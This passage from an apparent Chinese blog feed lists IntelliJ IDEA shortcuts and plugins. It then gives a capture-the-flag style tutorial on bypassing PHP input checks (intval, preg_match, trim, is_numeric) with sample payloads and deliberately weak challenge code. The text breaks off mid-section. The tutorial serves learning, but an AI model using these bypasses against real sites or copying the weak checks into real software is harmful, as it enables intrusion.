class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println()</span><br></pre></td></tr></table></figure></li><li><p><strong>Ctrl+X：删除当前行</strong></p></li><li><p><strong>Ctrl+D：复制当前行，也可复制多行</strong></p></li><li><p><strong>Alt+Insert(或右键Generate)：生成代码(如get,set方法,构造函数等)</strong></p></li><li><p><strong>Ctrl+Alt+T：生成try catch(或者 Alt+enter选择函数如if,else)</strong></p></li><li><p><strong>ctrl+shift+U：实现大小写之间的转换</strong></p></li><li><p><strong>alt+回车：导入包，自动修正</strong></p></li><li><p><strong>ctrl+alt+L：格式化代码</strong></p></li><li><p><strong>ctrl+alt+I：自动缩进</strong></p></li><li><p><strong>fori：生成for (int i &#x3D; 0; i &lt; ; i++) {}</strong></p></li><li><p><strong>ctrl+鼠标点击：快速找到成员变量的出处或函数定义</strong></p></li><li><p><strong>shift+F6：重构&#x2F;重命名 (包、类、方法、变量、甚至注释等)</strong></p></li><li><p><strong>ctrl+Q：查看当前方法的声明</strong></p></li><li><p><strong>ctrl+alt+V：自动创建变量（new 对象();之后选择按快捷键）</strong></p></li><li><p><strong>ctrl+O：重写方法</strong></p></li><li><p><strong>ctrl+I：实现方法</strong></p></li><li><p><strong>alt+&#x2F;：代码注释（采用&#x2F;&#x2F;注释）</strong></p></li><li><p><strong>ctrl+shift+&#x2F;：代码注释(采用&#x2F;</strong>&#x2F;注释)**</p></li><li><p><strong>ctrl+shift+R：在当前项目中替换指定内容</strong></p></li><li><p><strong>ctrl+P：显示方法参数信息</strong></p></li><li><p><strong>ctrl+shift+insert：查看历史复制记录，idea可以保留历史复制的 100 条记录</strong></p></li></ul><h4 id="控制台语句相关"><a href="#控制台语句相关" class="headerlink" title="控制台语句相关"></a>控制台语句相关</h4><ul><li><p><strong>sout+tab键</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println()</span><br></pre></td></tr></table></figure><blockquote><p>输出到控制台语句并换行。</p></blockquote></li><li><p><strong>souf+tab键</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(&quot;&quot;);</span><br></pre></td></tr></table></figure></li><li><p><strong>soutm+tab键</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(&quot;当前类名.方法名&quot;)</span><br></pre></td></tr></table></figure></li><li><p><strong>soutp+tab键</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(当前方法所有方法参数名+值)</span><br></pre></td></tr></table></figure></li></ul><h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><ul><li><strong>Ctrl + F：在当前文件进行文本查找</strong></li><li><strong>Ctrl + R：在当前文件进行文本替换</strong></li><li><strong>Shift + Ctrl + F：在项目进行文本查找</strong></li><li><strong>Shift + Ctrl + R：在项目进行文本替换</strong></li><li><strong>Shift + Shift：快速搜索（可同时代替下面三个快捷键）</strong></li><li><strong>Ctrl + N：查找class</strong></li><li><strong>Ctrl + Shift + N：查找文件</strong></li><li><strong>Ctrl + Shift + Alt + N：查找symbol（查找某个方法名）</strong></li></ul><h4 id="跳转切换"><a href="#跳转切换" class="headerlink" title="跳转切换"></a>跳转切换</h4><ul><li><strong>Ctrl + E：最近文件</strong></li><li><strong>Ctrl + Tab：切换文件</strong></li><li><strong>Ctrl + Alt + ←&#x2F;→：跳转历史光标所在处</strong></li><li><strong>Alt + ←&#x2F;→ 方向键：切换子tab</strong></li><li><strong>Ctrl + G：go to（跳转指定行号）</strong></li></ul><h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><ul><li><strong>Ctrl + W：快速选中</strong></li><li><strong>(Shift + Ctrl) + Alt + J：快速选中同文本</strong></li><li><strong>Ctrl + C&#x2F;Ctrl + X&#x2F;Ctrl + D：快速复制或剪切</strong></li><li><strong>多行选中 Tab ：tab</strong></li><li><strong>Ctrl + Y&#x2F;ctrl + X：删除整行</strong></li><li><strong>Shift + 点击Tab：快速关闭tab</strong></li><li><strong>Ctrl + Shift + enter：自动收尾，代码自动补全</strong></li><li><strong>Alt + ↑&#x2F;↓：方法快速跳转</strong></li><li><strong>F2：跳转到下一个高亮错误 或 警告位置</strong></li><li><strong>Alt + Insert：代码自动生成，如生成对象的 set &#x2F; get 方法，构造函数，toString() 等</strong></li><li><strong>Ctrl + Shift + L：格式化代码</strong></li><li><strong>Shift + F6：快速修改方法名、变量名、文件名、类名等</strong></li><li><strong>Ctrl + F6：快速修改方法签名</strong></li></ul><h4 id="代码阅读"><a href="#代码阅读" class="headerlink" title="代码阅读"></a>代码阅读</h4><ul><li><strong>Ctrl + P：方法参数提示显示</strong></li><li><strong>Ctrl + Shift + i：就可以在当前类里再弹出一个窗口出来</strong></li><li><strong>Alt + F7：可以列出变量在哪些地方被使用了</strong></li><li><strong>光标在子类接口名，Ctrl + u：跳到父类接口</strong></li><li><strong>Ctrl + Shift + ←&#x2F;→：移动窗口分割线</strong></li><li><strong>Ctrl + (Alt) + B：跳转方法定义&#x2F;实现</strong></li><li><strong>Ctrl + F12：Show Members 类成员快速显示</strong></li><li><strong>Ctrl + H：类的层级关系</strong></li></ul><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><ul><li><p><strong>JetBrains AI Assistant</strong></p><p>JetBrains AI Assistant 提供了一个全面的 AI 聊天，可以根据您的项目上下文回答与代码相关的问题。它还提供了各种 AI 操作来<strong>解释代码、发现问题、建议重构、生成测试、协助提交消息和文档</strong>等</p></li><li><p><strong>Key Promoter X 快捷键提示插件</strong></p><p>当你在IDE中使用鼠标点击一个按钮时，这个插件会提醒你可以使用的键盘快捷键。如果经常使用一个没有键盘快捷键的按钮，”Key Promoter X”会提示创建一个快捷键。如果已经很熟悉了某个快捷键，该插件支持设置了”不再显示”的选项。</p></li><li><p><strong>CodeGlance 显示代码缩略图插件</strong></p></li><li><p><strong>Save Actions 格式化代码插件</strong></p><p>可以帮忙我们优化包导入，自动给没有修改的变量添加final修饰符，调用方法的时候自动添加this关键字等，使我们的代码更规范统一。</p></li><li><p><strong>Translation 翻译插件</strong></p></li><li><p><strong>Maven Helper</strong> </p><p> 方便maven项目解决jar冲突</p></li><li><p><strong>jclasslib bytecode viewer</strong></p><p>查看字节码</p></li><li><p><strong>通义灵码</strong> </p><p>是基于通义大模型的智能编程辅助工具，提供行级&#x2F;函数级实时续写、自然语言生成代码、单元测试生成、代码优化、注释生成、代码解释、研发智能问答、异常报错排查等能力，并针对阿里云的云服务使用场景调优，助力开发者高效、流畅地编码</p></li><li><p><strong>Json Parser</strong></p><p>JSON解析器是一个用于验证和格式化JSON字符串的轻量级插件。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> java学习 </category>
          
          <category> Web </category>
          
          <category> 配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP黑魔法</title>
      <link href="/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/"/>
      <url>/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="黑魔法"><a href="#黑魔法" class="headerlink" title="黑魔法"></a>黑魔法</h2><p>所谓黑魔法，即指在web开发中，一些看似违反直觉，但能实现特殊功能的技巧或语言特性，而这些特性往往依赖php的弱类型、动态特性或隐式转换机制，就是利用函数的逻辑漏洞来进行攻击。</p><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>如果存在<code>&lt;?php include(&#39;flag.php&#39;);</code>，可以用下面的方法得到flag</p><h3 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h3><p>php全局变量$GLOBALS引用全局作用域中可用的全部变量，可利用这个特性看flag:</p><p><img src="/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/QQ20250119-191713.png"></p><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p>用法：**<code>var_dump(get_defined_vars())</code>**</p><p><img src="/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/QQ20250119-192121.png"></p><h2 id="intval-函数缺陷"><a href="#intval-函数缺陷" class="headerlink" title="intval()函数缺陷"></a>intval()函数缺陷</h2><p><strong><code>intval()</code></strong> 函数用于将其他类型的数据转化为整型数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br></pre></td></tr></table></figure><blockquote><p><code>$value</code>:需要使用intval()进行转化的数据</p><p><code>$base</code>：指定被转化数据采用的进制(默认为10进制)</p></blockquote><p><strong>字符串解析：</strong></p><ul><li><p>若字符串的<strong>首个字符不为数字且不为空格等空白字符</strong>，则该字符串转化为零。</p></li><li><p>若字符串的<strong>首个字符不为数字但为空格等空白字符</strong>，则尝试读取其余字符，若<strong>忽略到数字字符前的所有空白字符，在遇到非数字字符时停止对字符串的读取并将已读取字符串转化为数值。</strong></p><blockquote><p>即把前面空格去掉在解析</p></blockquote></li><li><p>若字符串的 <strong>首个字符为数字</strong>，则尝试读取其余字符，<strong>在遇到非数字字符（除符合科学计数法格式的字符 e 或 E外）时停止对字符串的读取并将已读取字符转化为数值。</strong></p></li></ul><h3 id="科学计数法绕过"><a href="#科学计数法绕过" class="headerlink" title="科学计数法绕过"></a>科学计数法绕过</h3><p>所以当遇到下面这些情况时就可用科学计数法绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>虽然科学计数法的数值（字符串）在某些版本（如php7.0.0）无法被**<code>intval()</code>正确解析**，但PHP是默认得到它的，在与数值 <code>1</code> 进行加法运算时，<code>$num</code> 将被 <code>PHP</code> 正确解析。</p><h3 id="进制转换绕过"><a href="#进制转换绕过" class="headerlink" title="进制转换绕过"></a>进制转换绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这种情况，就看他转换为八进制或者十六进制来绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0b?? : 二进制</span><br><span class="line">0??? : 八进制</span><br><span class="line">0X?? : 十六进制</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=0x117c || num=010574</span><br></pre></td></tr></table></figure><p>再看下面这种情况：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里就是正则匹配过滤了字母，所以不能用十六进制了，可以转换为八进制.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=010574</span><br></pre></td></tr></table></figure><h3 id="小数点绕过"><a href="#小数点绕过" class="headerlink" title="小数点绕过"></a>小数点绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;114514&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;  <span class="comment">//禁用字母</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;        <span class="comment">//禁止0开头</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>像上诉这个就不能使用进制转换了，那么可以使用传值小数，intval()会帮我们转换为整型，以此达到绕过的目的。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=114514.114514</span><br></pre></td></tr></table></figure><h2 id="preg-match-函数缺陷"><a href="#preg-match-函数缺陷" class="headerlink" title="preg_match()函数缺陷"></a>preg_match()函数缺陷</h2><p><img src="/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/QQ20250119-193819.png"></p><p><code>preg_match()</code>主要用于执行正则匹配，其基本语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int preg_match(string $pattern,string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )</span><br><span class="line">    参数说明：</span><br><span class="line"></span><br><span class="line">    $pattern: 要搜索的模式，字符串形式。</span><br><span class="line"></span><br><span class="line">    $subject: 输入字符串。</span><br><span class="line"></span><br><span class="line">    $matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</span><br><span class="line"></span><br><span class="line">    $flags：flags 可以被设置为以下标记值：</span><br><span class="line"></span><br><span class="line">        PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</span><br><span class="line"></span><br><span class="line">    offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</span><br></pre></td></tr></table></figure><p>而php手册告诉我们，该函数的返回值有三种，分别为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="number">1</span>; <span class="comment">//如果匹配到</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//如果没匹配到</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//匹配失败</span></span><br></pre></td></tr></table></figure><blockquote><p>安全的写法是使用 <strong>&#x3D;&#x3D;&#x3D;</strong> 运算符对返回值进行比较，手册推荐用效率更快的 <strong>strpos</strong> 函数替代 <strong>preg_match</strong> 函数</p></blockquote><p><img src="/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/QQ20250119-200627.png"></p><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p><code>preg_match</code>只能处理字符串，如果<strong>传入数组会返回false</strong>，不会进入if语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$num</span>[]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-zA-Z0-9]+$/&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//flag&#123;php_is_not_safe&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/QQ20250119-202651.png"></p><h3 id="0a换行符绕过"><a href="#0a换行符绕过" class="headerlink" title="%0a换行符绕过"></a>%0a换行符绕过</h3><p>**<code>.</code>不会匹配换行符(<code>\n</code>,<code>\r</code>)**，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*hello.*$/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="string">&#x27;hello&#x27;</span>)&#123;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/QQ20250119-212633.png"></p><blockquote><p>%0a不行</p></blockquote><p>而在<strong>非多行模式下(即&#x2F;i模式下）</strong>，**<code>$</code>会忽略在句尾的<code>%0a</code>**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^hello$/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="string">&#x27;hello&#x27;</span>)&#123;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>^和$字符用来匹配字符串的开始和结束，要求我们必须是hello</p></blockquote><p><img src="/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/QQ20250119-215529.png"></p><h3 id="回溯绕过"><a href="#回溯绕过" class="headerlink" title="回溯绕过"></a>回溯绕过</h3><p>具体可以参考p牛的博客：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>如果我们输入<code>phpinfo();//aaaaa</code>，由于**<code>.*</code>可以匹配任意字符，此时会进入贪婪模式，会将<code>phpinfo();//aaaaa</code>所有字符进行匹配**</p><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>，<strong>如果回溯次数大于1000000次时返回False</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello world&#x27;</span>+<span class="string">&#x27;h&#x27;</span>*<span class="number">1000000</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/hello.*world/is&quot;</span>,<span class="variable">$a</span>) == False</span><br></pre></td></tr></table></figure><h2 id="trim-及is-numberic-函数缺陷"><a href="#trim-及is-numberic-函数缺陷" class="headerlink" title="trim()及is_numberic()函数缺陷"></a>trim()及is_numberic()函数缺陷</h2><p><img src="/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/QQ20250120-184839.png"></p><p>trim函数会过滤空格以及<code>\n\r\t\v\x00</code>，但<strong>不会过滤<code>\f(%0c)(换行符)</code></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">#highlight_file(__FILE__);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot; \n\r\t\v\x00 a \f&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$a</span>));  <span class="comment">//a \f</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/PHP%E9%BB%91%E9%AD%94%E6%B3%95/QQ20250120-191224.png"></p><p><code>is_numberic</code>用于检测是否是数字或数字字符串，而当数字前面有<strong>空格或<code>\n\t\r\f\v</code>等换行符时会被认为是数字</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;\n1&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;\t1&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&quot;\f1&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="string">&quot;\r1&quot;</span>;</span><br><span class="line"><span class="variable">$e</span>=<span class="string">&quot;\v1&quot;</span>;</span><br><span class="line"><span class="variable">$f</span>=<span class="string">&quot; 1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$d</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$e</span>));<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$f</span>));<span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure><p>所以**<code>\f</code>能突破这两个函数的限制**，下面例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$num</span>=<span class="string">&quot;\f36&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//flag&#123;php_is_not_safe&#125;</span></span><br></pre></td></tr></table></figure><h2 id="strcmp函数缺陷"><a href="#strcmp函数缺陷" class="headerlink" title="strcmp函数缺陷"></a>strcmp函数缺陷</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strcmp ( string $str1 , string $str2 )</span><br></pre></td></tr></table></figure><p>参数 str1第一个字符串。str2第二个字符串。如果 